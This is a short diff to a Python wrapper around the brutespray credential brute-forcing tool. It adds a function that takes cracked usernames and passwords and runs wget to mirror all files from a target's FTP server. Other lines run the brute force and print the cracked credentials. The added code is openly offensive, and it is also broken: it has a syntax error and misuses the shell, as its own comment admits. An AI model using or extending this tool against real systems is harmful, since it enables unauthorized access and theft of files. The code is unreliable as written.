@@ -28,6 +28,16 @@ def run_brutespray(threads: int):
 	brute_out, brute_err = brute_poc.communicate()
 	print(brute_out.decode('utf-8'))
 
+def get_ftp_files(ip, username, password):
+	# this probably doesn't work yet
+	mkdir = "mkdir " + username + ":" + ip + ";"
+	wget = "wget -m ftp://" + username + ":" + password + "@" + ip + ";"
+	cmd = mkdir + wget
+	proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, shell=True)
+	out, err = proc.communicate()
+	if err not None:
+		print("files grabbed from",username,":",password,"@",ip)
+
 def show_cracked_info():
 	cracked_cmd = "cat brutespray-output/*"
 	cracked_proc = subprocess.Popen(cracked_cmd.split(), stdout=subprocess.PIPE)
